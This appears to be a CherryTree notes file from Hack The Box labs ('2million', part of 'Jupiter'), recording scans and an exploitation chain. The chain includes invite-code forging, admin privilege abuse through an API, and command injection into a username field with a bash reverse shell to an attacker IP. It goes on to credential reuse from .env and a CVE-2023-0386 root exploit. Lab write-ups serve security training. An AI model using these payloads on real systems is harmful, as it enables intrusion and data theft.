Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://2million.htb/">http://2million.htb/</rich_text>
        <rich_text>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 24.24 seconds</rich_text>
      </node>
      <node name="creds" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692107438" ts_lastsave="1692107439">
        <rich_text>admin:SuperDuperPass123</rich_text>
      </node>
      <node name="buster" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692101580" ts_lastsave="1692101581">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://2million.htb/">http://2million.htb/</rich_text>
        <rich_text> -C 502,500

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://2million.htb/">http://2million.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [502, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       11w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://2million.htb/logout">http://2million.htb/logout</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://2million.htb/">http://2million.htb/</rich_text>
        <rich_text>
200      GET        1l        8w      637c </rich_text>
        <rich_text link="webs http://2million.htb/js/inviteapi.min.js">http://2million.htb/js/inviteapi.min.js</rich_text>
        <rich_text>
405      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://2million.htb/api/v1/user/register">http://2million.htb/api/v1/user/register</rich_text>
        <rich_text>
200      GET       27l      201w    15384c </rich_text>
        <rich_text link="webs http://2million.htb/images/favicon.png">http://2million.htb/images/favicon.png</rich_text>
        <rich_text>
405      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://2million.htb/api/v1/user/login">http://2million.htb/api/v1/user/login</rich_text>
        <rich_text>
200      GET       80l      232w     3704c </rich_text>
        <rich_text link="webs http://2million.htb/login">http://2million.htb/login</rich_text>
        <rich_text>
401      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://2million.htb/api">http://2million.htb/api</rich_text>
        <rich_text>
200      GET       96l      285w     3859c </rich_text>
        <rich_text link="webs http://2million.htb/invite">http://2million.htb/invite</rich_text>
        <rich_text>
200      GET      260l      328w    29158c </rich_text>
        <rich_text link="webs http://2million.htb/images/logo-transparent.png">http://2million.htb/images/logo-transparent.png</rich_text>
        <rich_text>
200      GET      245l      317w    28522c </rich_text>
        <rich_text link="webs http://2million.htb/images/logofull-tr-web.png">http://2million.htb/images/logofull-tr-web.png</rich_text>
        <rich_text>
302      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://2million.htb/home">http://2million.htb/home</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://2million.htb/">http://2million.htb/</rich_text>
        <rich_text>
200      GET        5l     1881w   145660c </rich_text>
        <rich_text link="webs http://2million.htb/js/htb-frontend.min.js">http://2million.htb/js/htb-frontend.min.js</rich_text>
        <rich_text>
200      GET       13l     2458w   224695c </rich_text>
        <rich_text link="webs http://2million.htb/css/htb-frontend.css">http://2million.htb/css/htb-frontend.css</rich_text>
        <rich_text>
200      GET       94l      293w     4527c </rich_text>
        <rich_text link="webs http://2million.htb/register">http://2million.htb/register</rich_text>
        <rich_text>
200      GET       13l     2209w   199494c </rich_text>
        <rich_text link="webs http://2million.htb/css/htb-frontpage.css">http://2million.htb/css/htb-frontpage.css</rich_text>
        <rich_text>
200      GET        8l     3162w   254388c </rich_text>
        <rich_text link="webs http://2million.htb/js/htb-frontpage.min.js">http://2million.htb/js/htb-frontpage.min.js</rich_text>
        <rich_text>
200      GET     1242l     3326w    64952c </rich_text>
        <rich_text link="webs http://2million.htb/">http://2million.htb/</rich_text>
        <rich_text>
200      GET       46l      152w     1674c </rich_text>
        <rich_text link="webs http://2million.htb/404">http://2million.htb/404</rich_text>
        <rich_text>
405      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://2million.htb/api/v1/invite/verify">http://2million.htb/api/v1/invite/verify</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="js" unique_id="66" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692096217" ts_lastsave="1692096217">
        <rich_text>function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}</rich_text>
      </node>
      <node name="exploit" unique_id="65" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692096163" ts_lastsave="1692107920">
        <rich_text>go to /invite

find javascript

deobfuscate it

</rich_text>
        <rich_text link="webs https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</rich_text>
        <rich_text>

curl -X POST </rich_text>
        <rich_text link="webs http://2million.htb/api/v1/invite/how/to/generate">http://2million.htb/api/v1/invite/how/to/generate</rich_text>
        <rich_text> -d '{""}' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   253    0   249  100     4   3560     57 --:--:-- --:--:-- --:--:--  3666
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}

decode in cyberchef

</rich_text>
        <rich_text link="webs https://gchq.github.io/CyberChef">https://gchq.github.io/CyberChef</rich_text>
        <rich_text>

ROT13

In order to generate the invite code, make a POST request to /api/v1/invite/generate

curl -X POST </rich_text>
        <rich_text link="webs http://2million.htb/api/v1/invite/generate">http://2million.htb/api/v1/invite/generate</rich_text>
        <rich_text> | jq                 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    91    0    91    0     0   1224      0 --:--:-- --:--:-- --:--:--  1229
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "MUhXNE4tVjBJSjItRTgzMUgtRjlFWEk=",
    "format": "encoded"
  }
}

 echo "MUhXNE4tVjBJSjItRTgzMUgtRjlFWEk=" | base64 -d
1HW4N-V0IJ2-E831H-F9EXI

register user

login

go to access

</rich_text>
        <rich_text link="webs http://2million.htb/home/access">http://2million.htb/home/access</rich_text>
        <rich_text>

get connectionpack

check </rich_text>
        <rich_text link="webs http://2million.htb/api/v1">http://2million.htb/api/v1</rich_text>
        <rich_text>

PUT /api/v1/admin/settings/update

{"status":"danger","message":"Invalid content type."}

set content type application/json

{"status":"danger","message":"Missing parameter: email"}

set email

{
"email": "test@test.com"
}

{"status":"danger","message":"Missing parameter: is_admin"}

{
"email": "test@test.com",
"is_admin":1
}

{"id":13,"username":"test","is_admin":1}

go to 

</rich_text>
        <rich_text link="webs http://2million.htb/api/v1/admin/auth">http://2million.htb/api/v1/admin/auth</rich_text>
        <rich_text>

message	true

now generate admin pack

POST /api/v1/admin/vpn/generate HTTP/1.1

{
"username": "test",
"email": "test@test.com",
"is_admin":1
}

paste result to file

POST again to try RCE

POST /api/v1/admin/vpn/generate HTTP/1.1

{
"username": "test;curl 10.10.14.31",
"email": "test@test.com",
"is_admin":1
}

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (</rich_text>
        <rich_text link="webs http://0.0.0.0:80/">http://0.0.0.0:80/</rich_text>
        <rich_text>) ...
10.129.120.21 - - [15/Aug/2023 09:13:32] "GET / HTTP/1.1" 200 -


{
"username": "test;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1'",
"email": "test@test.com",
"is_admin":1
}

nc -lvnp 9001                       
listening on [any] 9001 ...
connect to [10.10.14.31] from (UNKNOWN) [10.129.120.21] 34952
bash: cannot set terminal process group (1098): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ 
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123


ssh admin@10.129.120.21   
admin@10.129.120.21's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
See "man sudo_root" for details.

admin@2million:~$ cat user.txt 
c9e68ff9eba6bb2b9e63c6991f535819

run linpeas.sh

admin@2million:/var/mail$ cat admin 
From: ch4p &lt;ch4p@2million.htb&gt;
To: admin &lt;admin@2million.htb&gt;
Cc: g0blin &lt;g0blin@2million.htb&gt;
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: &lt;9876543210@2million.htb&gt;
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

google for exploit

linux kernel OverlayFS exploit

</rich_text>
        <rich_text link="webs https://github.com/sxlmnwb/CVE-2023-0386">https://github.com/sxlmnwb/CVE-2023-0386</rich_text>
        <rich_text>

./fuse ./ovlcap/lower ./gc

./exp

admin@2million:/tmp$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601

admin@2million:/tmp$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Aug 15 13:54 .
drwxrwxr-x 6 root   root     4096 Aug 15 13:54 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
See "man sudo_root" for details.

root@2million:/tmp# cd /root
root@2million:/root# l
root.txt  snap/  thank_you.json
root@2million:/root# ls
root.txt  snap  thank_you.json
root@2million:/root# cat root.txt 
082fb5cc8a5a377c98f7b795363df4e1</rich_text>
      </node>
    </node>
    <node name="Jupiter" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692173055" ts_lastsave="1692965714">
      <node name="nmap" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692173058" ts_lastsave="1692173338">
        <rich_text>sudo nmap -p- -sC -sV 10.129.119.98 -oA nmap/all   
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-08-16 04:08 EDT
Nmap scan report for 10.129.119.98
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://jupiter.htb/">http://jupiter.htb/</rich_text>
        <rich_text>
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 29.65 seconds</rich_text>
      </node>
      <node name="buster" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692173338" ts_lastsave="1692173547">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://jupiter.htb/">http://jupiter.htb/</rich_text>
        <rich_text>            

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://jupiter.htb/">http://jupiter.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/js">http://jupiter.htb/js</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/js/">http://jupiter.htb/js/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/css">http://jupiter.htb/css</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/css/">http://jupiter.htb/css/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img">http://jupiter.htb/img</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/">http://jupiter.htb/img/</rich_text>
        <rich_text>
200      GET      268l      628w    11913c </rich_text>
        <rich_text link="webs http://jupiter.htb/portfolio.html">http://jupiter.htb/portfolio.html</rich_text>
        <rich_text>
200      GET      251l      759w    11969c </rich_text>
        <rich_text link="webs http://jupiter.htb/services.html">http://jupiter.htb/services.html</rich_text>
        <rich_text>
200      GET        7l       35w     3598c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/icons/si-4.png">http://jupiter.htb/img/icons/si-4.png</rich_text>
        <rich_text>
200      GET      399l     1181w    19680c </rich_text>
        <rich_text link="webs http://jupiter.htb/index.html">http://jupiter.htb/index.html</rich_text>
        <rich_text>
200      GET        6l       27w     3521c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/icons/si-2.png">http://jupiter.htb/img/icons/si-2.png</rich_text>
        <rich_text>
200      GET      225l      536w    10141c </rich_text>
        <rich_text link="webs http://jupiter.htb/contact.html">http://jupiter.htb/contact.html</rich_text>
        <rich_text>
200      GET        4l       66w    31000c </rich_text>
        <rich_text link="webs http://jupiter.htb/css/font-awesome.min.css">http://jupiter.htb/css/font-awesome.min.css</rich_text>
        <rich_text>
200      GET        5l       37w     4168c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/icons/si-1.png">http://jupiter.htb/img/icons/si-1.png</rich_text>
        <rich_text>
200      GET      182l      306w     4202c </rich_text>
        <rich_text link="webs http://jupiter.htb/js/main.js">http://jupiter.htb/js/main.js</rich_text>
        <rich_text>
200      GET        6l       26w     2932c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/icons/si-3.png">http://jupiter.htb/img/icons/si-3.png</rich_text>
        <rich_text>
200      GET        5l       79w     2505c </rich_text>
        <rich_text link="webs http://jupiter.htb/css/slicknav.min.css">http://jupiter.htb/css/slicknav.min.css</rich_text>
        <rich_text>
200      GET      351l      795w     6948c </rich_text>
        <rich_text link="webs http://jupiter.htb/css/magnific-popup.css">http://jupiter.htb/css/magnific-popup.css</rich_text>
        <rich_text>
200      GET      266l      701w    12613c </rich_text>
        <rich_text link="webs http://jupiter.htb/about.html">http://jupiter.htb/about.html</rich_text>
        <rich_text>
200      GET        6l       77w     3351c </rich_text>
        <rich_text link="webs http://jupiter.htb/css/owl.carousel.min.css">http://jupiter.htb/css/owl.carousel.min.css</rich_text>
        <rich_text>
200      GET     1159l     2347w    25252c </rich_text>
        <rich_text link="webs http://jupiter.htb/css/elegant-icons.css">http://jupiter.htb/css/elegant-icons.css</rich_text>
        <rich_text>
200      GET       86l      411w    41833c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/logo/logo-jupiter.png">http://jupiter.htb/img/logo/logo-jupiter.png</rich_text>
        <rich_text>
200      GET       63l      491w    46294c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/team/team-1.jpg">http://jupiter.htb/img/team/team-1.jpg</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/blog">http://jupiter.htb/img/blog</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/blog/">http://jupiter.htb/img/blog/</rich_text>
        <rich_text>
200      GET      158l      582w    49359c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/team/team-4.jpg">http://jupiter.htb/img/team/team-4.jpg</rich_text>
        <rich_text>
200      GET       79l      431w    32802c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/team/team-3.jpg">http://jupiter.htb/img/team/team-3.jpg</rich_text>
        <rich_text>
200      GET        9l      394w    24103c </rich_text>
        <rich_text link="webs http://jupiter.htb/js/masonry.pkgd.min.js">http://jupiter.htb/js/masonry.pkgd.min.js</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/fonts">http://jupiter.htb/fonts</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/fonts/">http://jupiter.htb/fonts/</rich_text>
        <rich_text>
200      GET        4l      212w    20216c </rich_text>
        <rich_text link="webs http://jupiter.htb/js/jquery.magnific-popup.min.js">http://jupiter.htb/js/jquery.magnific-popup.min.js</rich_text>
        <rich_text>
200      GET      584l     1619w    20977c </rich_text>
        <rich_text link="webs http://jupiter.htb/js/jquery.slicknav.js">http://jupiter.htb/js/jquery.slicknav.js</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/about">http://jupiter.htb/img/about</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/about/">http://jupiter.htb/img/about/</rich_text>
        <rich_text>
200      GET        7l      277w    44342c </rich_text>
        <rich_text link="webs http://jupiter.htb/js/owl.carousel.min.js">http://jupiter.htb/js/owl.carousel.min.js</rich_text>
        <rich_text>
200      GET     2174l     4138w    38852c </rich_text>
        <rich_text link="webs http://jupiter.htb/css/style.css">http://jupiter.htb/css/style.css</rich_text>
        <rich_text>
200      GET      371l     1767w   151469c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/callto-bg.jpg">http://jupiter.htb/img/callto-bg.jpg</rich_text>
        <rich_text>
200      GET      118l      859w    75695c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/team/team-2.jpg">http://jupiter.htb/img/team/team-2.jpg</rich_text>
        <rich_text>
200      GET        6l      685w    60132c </rich_text>
        <rich_text link="webs http://jupiter.htb/js/bootstrap.min.js">http://jupiter.htb/js/bootstrap.min.js</rich_text>
        <rich_text>
200      GET        2l     1283w    86927c </rich_text>
        <rich_text link="webs http://jupiter.htb/js/jquery-3.3.1.min.js">http://jupiter.htb/js/jquery-3.3.1.min.js</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/icons">http://jupiter.htb/img/icons</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/icons/">http://jupiter.htb/img/icons/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/work">http://jupiter.htb/img/work</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/work/">http://jupiter.htb/img/work/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/portfolio">http://jupiter.htb/img/portfolio</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/portfolio/">http://jupiter.htb/img/portfolio/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/logo">http://jupiter.htb/img/logo</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/logo/">http://jupiter.htb/img/logo/</rich_text>
        <rich_text>
200      GET      449l     2746w   227845c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/hero/juno.jpg">http://jupiter.htb/img/hero/juno.jpg</rich_text>
        <rich_text>
200      GET       18l      930w    89031c </rich_text>
        <rich_text link="webs http://jupiter.htb/js/mixitup.min.js">http://jupiter.htb/js/mixitup.min.js</rich_text>
        <rich_text>
200      GET      584l     2604w   274076c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/team-bg.jpg">http://jupiter.htb/img/team-bg.jpg</rich_text>
        <rich_text>
200      GET        6l     2099w   160357c </rich_text>
        <rich_text link="webs http://jupiter.htb/css/bootstrap.min.css">http://jupiter.htb/css/bootstrap.min.css</rich_text>
        <rich_text>
200      GET     1532l     9164w   702346c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/hero/jupiter-01.jpg">http://jupiter.htb/img/hero/jupiter-01.jpg</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/team">http://jupiter.htb/img/team</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/team/">http://jupiter.htb/img/team/</rich_text>
        <rich_text>
200      GET     6999l    31058w  2920253c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/hero/jupiter-02.png">http://jupiter.htb/img/hero/jupiter-02.png</rich_text>
        <rich_text>
200      GET      399l     1181w    19680c </rich_text>
        <rich_text link="webs http://jupiter.htb/">http://jupiter.htb/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/Source">http://jupiter.htb/Source</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/Source/">http://jupiter.htb/Source/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/testimonial">http://jupiter.htb/img/testimonial</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/testimonial/">http://jupiter.htb/img/testimonial/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://jupiter.htb/img/hero">http://jupiter.htb/img/hero</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://jupiter.htb/img/hero/">http://jupiter.htb/img/hero/</rich_text>
        <rich_text>
[####################] - 88s   450043/450043  0s      found:49      errors:52     
[####################] - 75s    30000/30000   398/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/">http://jupiter.htb/</rich_text>
        <rich_text> 
[####################] - 82s    30000/30000   367/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/js/">http://jupiter.htb/js/</rich_text>
        <rich_text> 
[####################] - 75s    30000/30000   399/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/css/">http://jupiter.htb/css/</rich_text>
        <rich_text> 
[####################] - 75s    30000/30000   398/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/">http://jupiter.htb/img/</rich_text>
        <rich_text> 
[####################] - 76s    30000/30000   396/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/blog/">http://jupiter.htb/img/blog/</rich_text>
        <rich_text> 
[####################] - 76s    30000/30000   396/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/fonts/">http://jupiter.htb/fonts/</rich_text>
        <rich_text> 
[####################] - 76s    30000/30000   397/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/about/">http://jupiter.htb/img/about/</rich_text>
        <rich_text> 
[####################] - 76s    30000/30000   396/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/icons/">http://jupiter.htb/img/icons/</rich_text>
        <rich_text> 
[####################] - 75s    30000/30000   398/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/work/">http://jupiter.htb/img/work/</rich_text>
        <rich_text> 
[####################] - 76s    30000/30000   397/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/portfolio/">http://jupiter.htb/img/portfolio/</rich_text>
        <rich_text> 
[####################] - 75s    30000/30000   397/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/logo/">http://jupiter.htb/img/logo/</rich_text>
        <rich_text> 
[####################] - 73s    30000/30000   414/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/team/">http://jupiter.htb/img/team/</rich_text>
        <rich_text> 
[####################] - 69s    30000/30000   433/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/Source/">http://jupiter.htb/Source/</rich_text>
        <rich_text> 
[####################] - 66s    30000/30000   457/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/testimonial/">http://jupiter.htb/img/testimonial/</rich_text>
        <rich_text> 
[####################] - 44s    30000/30000   681/s   </rich_text>
        <rich_text link="webs http://jupiter.htb/img/hero/">http://jupiter.htb/img/hero/</rich_text>
        <rich_text>




gobuster vhost -u </rich_text>
        <rich_text link="webs http://jupiter.htb/">http://jupiter.htb/</rich_text>
        <rich_text> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             </rich_text>
        <rich_text link="webs http://jupiter.htb/">http://jupiter.htb/</rich_text>
        <rich_text>
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/08/16 04:11:30 Starting gobuster in VHOST enumeration mode
===============================================================
Found: kiosk.jupiter.htb Status: 200 [Size: 34390]
Progress: 4872 / 4990 (97.64%)
===============================================================
2023/08/16 04:11:48 Finished
===============================================================</rich_text>
      </node>
      <node name="creds" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692173547" ts_lastsave="1692180282">
        <rich_text>jovian
postgresql
juno</rich_text>
      </node>
      <node name="exploit" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692173549" ts_lastsave="1692266542">
        <rich_text>on kiosk.jupiter.htb set time range and intercept the message in burp 

it is sending raw sql queries

SELECT table_name FROM information_schema.tables;

